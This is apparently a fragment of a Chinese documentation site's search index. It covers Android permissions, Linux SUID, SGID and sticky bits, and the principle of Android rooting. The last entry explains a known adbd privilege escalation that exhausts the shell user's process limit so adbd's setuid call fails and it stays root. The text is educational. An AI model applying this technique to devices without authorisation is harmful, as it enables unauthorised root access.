android.permission.SET_PROCESS_LIMIT //\u5141\u8bb8\u8bbe\u7f6e\u6700\u5927\u7684\u8fd0\u884c\u8fdb\u7a0b\u6570\u91cf android.permission.SET_TIME_ZONE //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u65f6\u95f4\u533a\u57df android.permission.SET_WALLPAPER //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8 android.permission.SET_WALLPAPER_HINTS //\u5141\u8bb8\u7a0b\u5e8f\u8bbe\u7f6e\u58c1\u7eb8hits android.permission.SIGNAL_PERSISTENT_PROCESSES //\u5141\u8bb8\u7a0b\u5e8f\u8bf7\u6c42\u53d1\u9001\u4fe1\u53f7\u5230\u6240\u6709\u663e\u793a\u7684\u8fdb\u7a0b\u4e2d android.permission.STATUS_BAR //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u3001\u5173\u95ed\u6216\u7981\u7528\u72b6\u6001\u680f\u53ca\u56fe\u6807Allows an application to open, close, or disable the status bar and its icons. android.permission.SUBSCRIBED_FEEDS_READ //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u8ba2\u9605RSS Feed\u5185\u5bb9\u63d0\u4f9b android.permission.SUBSCRIBED_FEEDS_WRITE //\u7cfb\u7edf\u6682\u65f6\u4fdd\u7559\u6539\u8bbe\u7f6e,android\u5f00\u53d1\u7f51\u8ba4\u4e3a\u672a\u6765\u7248\u672c\u4f1a\u52a0\u5165\u8be5\u529f\u80fd\u3002 android.permission.SYSTEM_ALERT_WINDOW //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5f00\u7a97\u53e3\u4f7f\u7528 TYPE_SYSTEM_ALERT\uff0c\u663e\u793a\u5728\u5176\u4ed6\u6240\u6709\u7a0b\u5e8f\u7684\u9876\u5c42(Allows an application to open windows using the type TYPE_SYSTEM_ALERT, shown on top of all other applications. ) android.permission.VIBRATE //\u5141\u8bb8\u8bbf\u95ee\u632f\u52a8\u8bbe\u5907 android.permission.WAKE_LOCK //\u5141\u8bb8\u4f7f\u7528PowerManager\u7684 WakeLocks\u4fdd\u6301\u8fdb\u7a0b\u5728\u4f11\u7720\u65f6\u4ece\u5c4f\u5e55\u6d88\u5931 android.permission.WRITE_APN_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165APN\u8bbe\u7f6e android.permission.WRITE_CALENDAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.WRITE_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.WRITE_GSERVICES //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539Google\u670d\u52a1\u5730\u56fe android.permission.WRITE_OWNER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5199\u5165\u4f46\u4e0d\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.WRITE_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6216\u5199\u5165\u7cfb\u7edf\u8bbe\u7f6e android.permission.WRITE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u77ed\u4fe1 android.permission.WRITE_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u5199\u5165\u540c\u6b65\u8bbe\u7f6e","title":"APK\u5728AndroidManifest.xml\u5e38\u7528\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#linux","text":"\u53d1\u5e03\u4e8e: \u4e00\u822c\u6587\u4ef6\u6743\u9650\u8bfb\uff08R\uff09\uff0c\u5199(W)\uff0c\u6267\u884c\uff08X\uff09\u6743\u9650\u6bd4\u8f83\u7b80\u5355\u3002\u4e00\u822c\u6750\u6599\u4e0a\u9762\u90fd\u6709\u4ecb\u7ecd\u3002 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0b\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u6743\u9650\u2014\u2014SUID\uff0cSGID\uff0cStick bit\u3002\u5982\u679c\u4f60\u68c0\u67e5\u4e00\u4e0b/usr/bin/passwd\u548c/tmp/\u7684\u6587\u4ef6\u6743\u9650\u4f60\u5c31\u4f1a\u53d1\u73b0\u548c\u666e\u901a\u7684\u6587\u4ef6\u6743\u9650\u6709\u5c11\u8bb8\u4e0d\u540c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8fd9\u91cc\u5c31\u6d89\u53ca\u5230SUID\u548cStick bit\u3002 SUID\u548cSGID \u6211\u4eec\u9996\u5148\u6765\u8c08\u4e00\u4e0bpasswd\u7a0b\u5e8f\u7279\u6b8a\u7684\u5730\u65b9\u3002\u5927\u5bb6\u90fd\u77e5\u9053\uff0cLinux\u628a\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f\u5b58\u653e\u5728/etc/shadow\u91cc\u9762\uff0c\u8be5\u6587\u4ef6\u5c5e\u6027\u5982\u4e0b\uff1a \u53ef\u4ee5\u770b\u5230Shadow\u7684\u53ea\u6709\u6240\u6709\u8005\u53ef\u8bfb\u5199\uff0c\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u8be5\u6587\u4ef6\u5bf9\u666e\u901a\u7528\u6237\u662f\u4e0d\u53ef\u8bfb\u5199\u7684\u3002\u4f46\u662f\u666e\u901a\u7528\u6237\u8c03\u7528passwd\u7a0b\u5e8f\u662f\u53ef\u4ee5\u4fee\u6539\u81ea\u5df1\u7684\u5bc6\u7801\u7684\uff0c\u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\u96be\u9053\u666e\u901a\u7528\u6237\u53ef\u4ee5\u8bfb\u5199shadow\u6587\u4ef6\uff1f\u5f53\u7136\u4e0d\u662f\u5566\u3002password\u53ef\u4ee5\u4fee\u6539shadow\u6587\u4ef6\u7684\u539f\u56e0\u662f\u4ed6\u8bbe\u7f6e\u4e86SUID\u6587\u4ef6\u6743\u9650\u3002 SUID\u6587\u4ef6\u6743\u9650\u4f5c\u7528\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u3002\u4e00\u822c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5728\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u662f\u5f53\u524d\u7528\u6237\uff0c\u6bd4\u5982\u5f53\u524d\u7cfb\u7edf\u7528\u6237\u662fsimon\uff0csimon\u8fd0\u884c\u7a0b\u5e8fa.out\uff0ca.out\u6267\u884c\u671f\u7684\u6240\u6709\u8005\u5e94\u8be5\u662fsimon\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u7ed9\u53ef\u6267\u884c\u6587\u4ef6\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5219\u8be5\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u6240\u6709\u8005\uff0c\u5c31\u662f\u8be5\u6587\u4ef6\u6240\u6709\u8005 \u3002\u8fd8\u4ee5\u524d\u9762\u7684a.out\u4e3a\u4f8b\uff0c\u5047\u5982a.out\u8bbe\u7f6e\u4e86SUID\uff0c\u5e76\u4e14\u5176\u6240\u6709\u8005\u662froot\uff0c\u7cfb\u7edf\u5f53\u524d\u7528\u6237\u662fsimon\uff0c\u5f53simon\u8fd0\u884ca.out\u7684\u65f6\u5019\uff0ca.out\u5728\u8fd0\u884c\u671f\u7684\u6240\u6709\u8005\u5c31\u662froot\uff0c\u8fd9\u65f6a.out\u53ef\u4ee5\u5b58\u53d6\u53ea\u6709root\u6743\u9650\u624d\u80fd\u5b58\u53d6\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u8bfb\u5199shadow\u6587\u4ef6\u3002\u5f53a.out\u6267\u884c\u7ed3\u675f\u7684\u65f6\u5019\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u53c8\u56de\u5230\u4e86simon\u7684\u6743\u9650\u4e86\u3002 passwd\u5c31\u662f\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u5e76\u4e14passwd\u7684\u6240\u6709\u8005\u662froot\uff0c\u6240\u4ee5\u6240\u6709\u7684\u7528\u6237\u90fd\u53ef\u4ee5\u6267\u884c\u4ed6\uff0c\u5728passwd\u8fd0\u884c\u671f\uff0c\u7a0b\u5e8f\u83b7\u5f97\u4e34\u65f6\u7684root\u6743\u9650\uff0c\u8fd9\u65f6\u5176\u53ef\u4ee5\u5b58\u53d6shadow\u6587\u4ef6\u3002\u5f53passwd\u8fd0\u884c\u5b8c\u6210\uff0c\u5f53\u524d\u7528\u6237\u53c8\u56de\u5230\u666e\u901a\u6743\u9650\u3002 \u540c\u7406\uff0c\u8bbe\u7f6e\u7a0b\u5e8f\u7684SGID\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u8fd0\u884c\u671f\u53ef\u4ee5\u4e34\u65f6\u83b7\u5f97\u6240\u6709\u8005\u7ec4\u7684\u6743\u9650\u3002\u5728\u56e2\u961f\u5f00\u53d1\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6587\u4ef6\u6743\u9650\u6bd4\u8f83\u6709\u7528\uff0c\u4e00\u822c\u7cfb\u7edf\u7528SUID\u6bd4\u8f83\u591a\u3002 SGID\u53ef\u4ee5\u7528\u4e8e\u76ee\u5f55\uff0c\u5f53\u76ee\u5f55\u8bbe\u7f6e\u4e86SGID\u4e4b\u540e\uff0c\u5728\u8be5\u76ee\u5f55\u4e0b\u9762\u5efa\u7acb\u7684\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u76f8\u540c\u7684\u7528\u6237\u7ec4\u3002 Stick bit(\u7c98\u8d34\u4f4d) \u5bf9\u7a0b\u5e8f\uff0c\u8be5\u6743\u9650\u544a\u8bc9\u7cfb\u7edf\u5728\u7a0b\u5e8f\u5b8c\u6210\u540e\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e00\u4efd\u8fd0\u884c\u7a0b\u5e8f\u7684\u5907\u4efd\uff0c\u5982\u8be5\u7a0b\u5e8f\u5e38\u7528\uff0c\u53ef\u4e3a\u7cfb\u7edf\u8282\u7701\u70b9\u65f6\u95f4\uff0c\u4e0d\u7528\u6bcf\u6b21\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u3002Linux\u5f53\u524d\u5bf9\u6587\u4ef6\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u4e00\u4e9b\u5176\u4ed6\u7684UNIX\u7cfb\u7edf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002 Stick bit\u53ef\u4ee5\u4f5c\u7528\u4e8e\u76ee\u5f55\uff0c\u5728\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u7684\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u53ea\u6709\u6240\u6709\u8005\u548croot\u53ef\u4ee5\u5220\u9664\u4ed6\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u56de\u5934\u53bb\u770b\u770b/tmp/\u76ee\u5f55\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u76ee\u5f55\u8bbe\u7f6e\u4e86\u7c98\u8d34\u4f4d\u3002\u6240\u4ee5\u8bf4\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5bf9\u8be5\u76ee\u5f55\u8bfb\u5199\u6267\u884c\uff08777\uff09\uff0c\u8fd9\u6837\u610f\u5473\u7740\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u5728/tmp/\u4e0b\u9762\u521b\u5efa\u4e34\u65f6\u76ee\u5f55\u3002\u56e0\u4e3a\u8bbe\u7f6eStick bit\u53ea\u6709\u6240\u6709\u8005\u548croot\u624d\u80fd\u5220\u9664\u76ee\u5f55\u3002\u8fd9\u6837\u666e\u901a\u7528\u6237\u53ea\u80fd\u5220\u9664\u5c5e\u4e8e\u81ea\u5df1\u7684\u6587\u4ef6\uff0c\u800c\u4e0d\u80fd\u5220\u9664\u5176\u4ed6\u4eba\u7684\u6587\u4ef6\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u8bbe\u7f6eSUID\uff0cSGID\uff0cStick bit \u524d\u9762\u4ecb\u7ecd\u8fc7SUID\u4e0eSGID\u7684\u529f\u80fd\uff0c\u90a3\u4e48\uff0c\u5982\u4f55\u6253\u5f00\u6587\u4ef6\u4f7f\u5176\u6210\u4e3a\u5177\u6709SUID\u4e0eSGID\u7684\u6743\u9650\u5462\uff1f\u8fd9\u5c31\u9700\u8981\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u4e86\u3002\u73b0\u5728\u5e94\u8be5\u77e5\u9053\uff0c\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u7684\u65b9\u5f0f\u4e3a\u201c3\u4e2a\u6570\u5b57\u201d\u7684\u7ec4\u5408\uff0c\u90a3\u4e48\uff0c\u5982\u679c\u5728\u8fd93\u4e2a\u6570\u5b57\u4e4b\u524d\u518d\u52a0\u4e0a\u4e00\u4e2a\u6570\u5b57\uff0c\u6700\u524d\u9762\u7684\u6570\u5b57\u5c31\u8868\u793a\u8fd9\u51e0\u4e2a\u5c5e\u6027\u4e86\uff08\u6ce8\uff1a\u901a\u5e38\u6211\u4eec\u4f7f\u7528chmod 0777 filename\u7684\u65b9\u5f0f\u6765\u8bbe\u7f6efilename\u7684\u5c5e\u6027\u65f6\uff0c\u5219\u662f\u5047\u8bbe\u6ca1\u6709SUID\u3001SGID\u53caSticky bit\uff09\u3002 4\u4e3aSUID 2\u4e3aSGID 1\u4e3aSticky bit \u5047\u8bbe\u8981\u5c06\u4e00\u4e2a\u6587\u4ef6\u5c5e\u6027\u6539\u4e3a\u201c-rwsr-xr-x\u201d\uff0c\u7531\u4e8es\u5728\u7528\u6237\u6743\u9650\u4e2d\uff0c\u6240\u4ee5\u662fSUID\uff0c\u56e0\u6b64\uff0c\u5728\u539f\u5148\u7684755\u4e4b\u524d\u8fd8\u8981\u52a0\u4e0a4\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u201cchmod 4755 filename\u201d\u6765\u8bbe\u7f6e\u3002 SUID\u4e5f\u53ef\u4ee5\u7528\u201cchmod u+s filename\u201d\u6765\u8bbe\u7f6e\uff0c\u201cchmod u-s filename\u201d\u6765\u53d6\u6d88SUID\u8bbe\u7f6e\uff1b\u540c\u6837\uff0cSGID\u53ef\u4ee5\u7528\u201cchmod g+s filename\u201d\uff0c\u201cchmod g-s filename\u201d\u6765\u53d6\u6d88SGID\u8bbe\u7f6e\u3002","title":"Linux\u7684\u7279\u6b8a\u6587\u4ef6\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#androidroot_1","text":"\u83b7\u5f97root\u6743\u9650\u7684\u4ee3\u7801\u5982\u4e0b\uff1a Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os =new DataOutputStream(process.getOutputStream()); ...... os.writeBytes(\"exit\\n\"); os.flush(); process.waitFor(); \u4ece\u4e0a\u9762\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9996\u5148\u8981\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u5176\u5b9eroot\u7684\u79d8\u5bc6\u90fd\u5728su\u7a0b\u5e8f\u4e2d\uff0cAndroid\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\u53ea\u80fdroot\u548cshell\u53ef\u4ee5\u7528\u8fd0\u884csu\uff0c\u5982\u679c\u628a\u8fd9\u4e2a\u9650\u5236\u62ff\u6389\uff0c\u5c31\u662froot\u7834\u89e3\u4e86\uff01 \u4e0b\u9762\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\u662f\u600e\u6837\u83b7\u5f97root\u6743\u9650\u7684\uff0c\u5982\u679c\u5bf9Linux\u7684su\u547d\u4ee4\u719f\u6089\u7684\u670b\u53cb\u53ef\u80fd\u77e5\u9053su\u7a0b\u5e8f\u90fd\u8bbe\u7f6eSUID\u4f4d\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u5df2\u7ecfroot\u7834\u89e3\u4e0a\u7684su\u6743\u9650\u8bbe\u7f6e\uff0c \u6211\u4eec\u53d1\u73b0su\u7684\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\uff0c\u662f\u5176\u5b9e\u662fbusybox\u7684\u8f6f\u94fe\u63a5\uff0c\u6211\u4eec\u67e5\u770bbusybox\u7684\u5c5e\u6027\u53d1\u73b0\uff0c\u5176\u8bbe\u7f6e\u4e86SUID\u548cSGID\uff0c\u5e76\u4e14\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\u3002\u8fd9\u6837\u8fd0\u884cbusybox\u7684\u666e\u901a\u7528\u6237\uff0cbusybox\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u83b7\u5f97\u7684\u662froot\u7684\u6709\u6548\u7528\u6237\u3002su\u7a0b\u5e8f\u5219\u662f\u628a\u81ea\u5df1\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5e76\u628a\u81ea\u5df1\u6743\u9650\u63d0\u5347\u81f3root\uff08\u6211\u4eec\u524d\u9762\u63d0\u5230su\u5176\u5b9e\u5c31\u662fbusybox\uff0c\u8fd0\u884c\u671f\u5b83\u7684\u6743\u9650\u662froot\uff0c\u5f53\u7136\u4e5f\u6709\u6743\u9650\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 \u518d\u5f3a\u8c03\u4e00\u4e0b\u4e0d\u5149root\u624b\u673a\u4e0asu\u9700\u8981\u8bbe\u7f6eSUID\uff0c\u6240\u6709\u7684Linux\u7cfb\u7edf\u4e0a\u7684su\u7a0b\u5e8f\u90fd\u9700\u8981\u8bbe\u7f6eSUID\u4f4d\u3002 \u6211\u4eec\u53d1\u73b0su\u4e5f\u8bbe\u7f6e\u4e86SUID\u4f4d\uff0c\u8fd9\u6837\u666e\u901a\u7528\u6237\u4e5f\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0csu\u7a0b\u5e8f\u4f1a\u9a8c\u8bc1root \u5bc6\u7801\uff0c\u5982\u679c\u6b63\u786esu\u7a0b\u5e8f\u53ef\u4ee5\u628a\u7528\u6237\u6743\u9650\u63d0\u9ad8\u7684root\uff08\u56e0\u4e3a\u5176\u8bbe\u7f6eSUID\u4f4d\uff0c\u8fd0\u884c\u671f\u662froot\u6743\u9650\uff0c\u8fd9\u6837\u5176\u6709\u6743\u9650\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 Android\u7cfb\u7edf\u7684\u7834\u89e3\u7684\u6839\u672c\u539f\u7406\u5c31\u662f\u66ff\u6362\u6389\u7cfb\u7edf\u4e2d\u7684su\u7a0b\u5e8f\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7684\u9ed8\u8ba4su\u7a0b\u5e8f\u9700\u8981\u9a8c\u8bc1\u5b9e\u9645\u7528\u6237\u6743\u9650\uff08\u53ea\u6709root\u548cshell\u7528\u6237\u624d\u6709\u6743\u8fd0\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\uff0c\u5176\u4ed6\u7528\u6237\u8fd0\u884c\u90fd\u4f1a\u8fd4\u56de\u9519\u8bef\uff09\u3002\u800c\u7834\u89e3\u540e\u7684su\u5c06\u4e0d\u68c0\u67e5\u5b9e\u9645\u7528\u6237\u6743\u9650\uff0c\u8fd9\u6837\u666e\u901a\u7684\u7528\u6237\u4e5f\u5c06\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u7a0b\u5e8f\u5c06\u81ea\u5df1\u7684\u6743\u9650\u63d0\u5347\u3002 root\u7834\u89e3\u6ca1\u6709\u5229\u7528\u4ec0\u4e48Linux\u5185\u6838\u6f0f\u6d1e\uff08Linux\u5185\u6838\u4e0d\u53ef\u80fd\u6709\u8fd9\u4e48\u5927\u7684\u6f0f\u6d1e\u5b58\u5728\uff09\uff0c\u53ef\u4ee5\u7406\u89e3\u6210root\u7834\u89e3\u5c31\u662f\u5728\u4f60\u7cfb\u7edf\u4e2d\u690d\u5165\u201c\u6728\u9a6csu\u201d\uff0c\u8bf4\u5b83\u662f\u201c\u6728\u9a6c\u201d\u4e00\u70b9\u513f\u90fd\u4e0d\u4e3a\u8fc7\uff0c\u5047\u5982\u6076\u610f\u7a0b\u5e8f\u5728\u7cfb\u7edf\u4e2d\u8fd0\u884c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\u7684\u8fd9\u6837\u7684\u7ed3\u679c\u5c06\u4f1a\u662f\u707e\u96be\u6027\u7684\u3002\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0broot\u8fc7\u624b\u673a\u90fd\u4f1a\u6709\u4e00\u4e2aSuperUser\u5e94\u7528\u7a0b\u5e8f\u6765\u8ba9\u7528\u6237\u7ba1\u7406\u5141\u8bb8\u8c01\u83b7\u5f97root\u6743\u9650.\u4f46\u662f\u8981\u66ff\u6362\u6389\u7cfb\u7edf\u4e2dsu\u7a0b\u5e8f\u672c\u8eab\u5c31\u662f\u9700\u8981root\u6743\u9650\u7684\uff0c\u600e\u6837\u5728root\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\uff0c\u5047\u8bbe\u9700\u8981\u7834\u89e3\u7684Android\u7cfb\u7edf\u5177\u5907\u5982\u4e0b\u6761\u4ef6\uff1a 1\u3001\u53ef\u4ee5\u901a\u8fc7adb\u8fde\u63a5\u5230\u8bbe\u5907\uff0c\u4e00\u822c\u610f\u5473\u7740\u9a71\u52a8\u7a0b\u5e8f\u5df2\u7ecf\u5b89\u88c5\u3002 2\u3001\u4f46\u662fadb\u83b7\u5f97\u7528\u6237\u6743\u9650\u662fshell\u7528\u6237\uff0c\u800c\u4e0d\u662froot\u3002 \u5148\u4e86\u89e3\u4e00\u4e0badb\u5de5\u5177\uff0c\u8bbe\u5907\u7aef\u6709adbd\u670d\u52a1\u7a0b\u5e8f\u540e\u53f0\u8fd0\u884c\uff0c\u4e3a\u5f00\u53d1\u673a\u7684adb\u7a0b\u5e8f\u63d0\u4f9b\u670d\u52a1\uff0cadbd\u7684\u6743\u9650\uff0c\u51b3\u5b9a\u4e86adb\u7684\u6743\u9650\u3002\u5177\u4f53\u7528\u6237\u53ef\u67e5\u770b/system/core/adb\u4e0b\u7684\u6e90\u7801\uff0c\u67e5\u770bAndroid.mk\u4f60\u5c06\u4f1a\u53d1\u73b0adb\u548cadbd\u5176\u5b9e\u662f\u4e00\u4efd\u4ee3\u7801\uff0c\u7136\u540e\u901a\u8fc7\u5b8f\u6765\u7f16\u8bd1\u3002 \u67e5\u770badb.c\u7684adb_main\u51fd\u6570\u4f60\u5c06\u4f1a\u53d1\u73b0adbd\u4e2d\u6709\u5982\u4e0b\u4ee3\u7801\uff1a 1:int adb_main(int is_daemon) 2: { 3: ...... 4: property_get(\"ro.secure\", value,\"\"); 5: if (strcmp(value,\"1\") == 0) { 6: // don't run as root if ro.secure is set... 7: secure = 1; 8: ...... 9: } 10: 11: if (secure) { 12: ...... 13: setgid(AID_SHELL); 14: setuid(AID_SHELL); 15: ...... 16: } 17: } \u4ece\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230adbd\u4f1a\u68c0\u6d4b\u7cfb\u7edf\u7684ro.secure\u5c5e\u6027\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u4e3a1\u5219\u5c06\u4f1a\u628a\u81ea\u5df1\u7684\u7528\u6237\u6743\u9650\u964d\u7ea7\u6210shell\u7528\u6237\u3002\u4e00\u822c\u8bbe\u5907\u51fa\u5382\u7684\u65f6\u5019\u5728/default.prop\u6587\u4ef6\u4e2d\u90fd\u4f1a\u6709\uff1a 1: ro.secure=1 \u8fd9\u6837\u5c06\u4f1a\u4f7fadbd\u542f\u52a8\u7684\u65f6\u5019\u81ea\u52a8\u964d\u7ea7\u6210shell\u7528\u6237\u3002 \u7136\u540e\u6211\u4eec\u518d\u4ecb\u7ecd\u4e00\u4e0badbd\u5728\u4ec0\u4e48\u65f6\u5019\u542f\u52a8\u7684\u5462\uff1f\u7b54\u6848\u662f\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u7531init\u8fdb\u7a0b\u542f\u52a8\u3002\u6211\u4eec\u67e5\u770binit.rc\u4e2d\u6709\u5982\u4e0b\u5185\u5bb9\uff1a 1: # adbd is controlled by the persist.service.adb.enable system property 2: service adbd /sbin/adbd 3: disabled \u5bf9Android\u5c5e\u6027\u7cfb\u7edf\u5c11\u6709\u4e86\u89e3\u7684\u670b\u53cb\u5c06\u4f1a\u77e5\u9053\uff0c\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\u542f\u52a8\u7684\u65f6\u5019\u90fd\u662froot\u6743\u9650\uff08\u56e0\u4e3ainit\u8fdb\u884c\u662froot\u6743\u9650\uff0c\u5176\u5b50\u7a0b\u5e8f\u4e5f\u662froot\uff09\u3002\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5728adbd\u7a0b\u5e8f\u5728\u6267\u884c\uff1a 1:/* then switch user and group to \"shell\" */ 2: setgid(AID_SHELL); 3: setuid(AID_SHELL); \u4ee3\u7801\u4e4b\u524d\u90fd\u662froot\u6743\u9650\uff0c\u53ea\u6709\u6267\u884c\u8fd9\u4e24\u53e5\u4e4b\u540e\u624d\u53d8\u6210shell\u6743\u9650\u7684\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f15\u51faroot\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\u7684\u65b9\u6cd5\u4e86\uff0c\u90a3\u5c31\u662f\u8ba9\u4e0a\u9762setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u964d\u7ea7\u5931\u8d25\uff0c\u90a3\u5c31\u7ee7\u7eed\u5728root\u6743\u9650\u4e0b\u9762\u8fd0\u884c\u4e86\u3002 \u8fd9\u91cc\u9762\u505a\u4e00\u4e2a\u7b80\u5355\u8bf4\u660e\uff1a 1\u3001\u51fa\u5382\u8bbe\u7f6e\u7684ro.secure\u5c5e\u6027\u4e3a1\uff0c\u5219adbd\u4e5f\u5c06\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 2\u3001adb\u5de5\u5177\u521b\u5efa\u7684\u8fdb\u7a0bratc\u4e5f\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 3\u3001ratc\u4e00\u76f4\u521b\u5efa\u5b50\u8fdb\u7a0b\uff08ratc\u521b\u5efa\u7684\u5b50\u7a0b\u5e8f\u4e5f\u5c06\u4f1a\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff09\uff0c\u7d27\u63a5\u7740\u5b50\u7a0b\u5e8f\u9000\u51fa\uff0c\u5f62\u6210\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5360\u7528shell\u7528\u6237\u7684\u8fdb\u7a0b\u8d44\u6e90\uff0c\u76f4\u5230\u5230\u8fbeshell\u7528\u6237\u7684\u8fdb\u7a0b\u6570\u4e3aRLIMIT_NPROC\u7684\u65f6\u5019\uff08\u5305\u62ecadbd\u3001ratc\u53ca\u5176\u5b50\u7a0b\u5e8f\uff09\uff0c\u8fd9\u662fratc\u5c06\u4f1a\u521b\u5efa\u5b50\u8fdb\u7a0b\u5931\u8d25\u3002\u8fd9\u65f6\u5019\u6740\u6389adbd\uff0cadbd\u8fdb\u7a0b\u56e0\u4e3a\u662fAndroid\u7cfb\u7edf\u670d\u52a1\uff0c\u5c06\u4f1a\u88abAndroid\u7cfb\u7edf\u81ea\u52a8\u91cd\u542f\uff0c\u8fd9\u65f6\u5019ratc\u4e5f\u5728\u7ade\u4e89\u4ea7\u751f\u5b50\u7a0b\u5e8f\u3002\u5728adbd\u7a0b\u5e8f\u6267\u884c\u4e0a\u9762setgid\u548csetuid\u4e4b\u524d\uff0cratc\u5df2\u7ecf\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\uff0c\u90a3\u4e48shell\u7528\u6237\u7684\u8fdb\u7a0b\u9650\u989d\u5df2\u7ecf\u8fbe\u5230\uff0c\u5219adbd\u8fdb\u7a0b\u6267\u884csetgid\u548csetuid\u5c06\u4f1a\u5931\u8d25\u3002\u6839\u636e\u4ee3\u7801\u6211\u4eec\u53d1\u73b0\u5931\u8d25\u4e4b\u540eadbd\u5c06\u4f1a\u7ee7\u7eed\u6267\u884c\u3002\u8fd9\u6837adbd\u8fdb\u7a0b\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 